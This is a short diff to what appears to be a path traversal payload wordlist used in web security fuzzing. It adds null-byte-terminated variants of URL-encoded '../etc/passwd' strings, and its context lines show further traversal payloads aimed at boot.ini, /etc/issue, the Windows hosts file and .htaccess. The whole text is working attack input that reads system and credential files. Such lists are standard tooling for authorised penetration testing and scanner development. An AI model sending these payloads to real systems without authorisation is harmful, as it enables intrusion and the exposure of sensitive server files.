@@ -3464,6 +3464,7 @@ $dddddddd/etc$eeeeeee/passwd$ggggggg
 %2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini;index.html
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
 %2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
 %2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
 %2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73
@@ -3489,6 +3490,7 @@ $dddddddd/etc$eeeeeee/passwd$ggggggg
 %2e%2e%2fboot.ini;index.html
 %2e%2e%2fetc%2fissue
 %2e%2e%2fetc%2fpasswd
+%2e%2e%2fetc%2fpasswd%00
 %2e%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
 %2e%2e%2f{FILE}
 %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
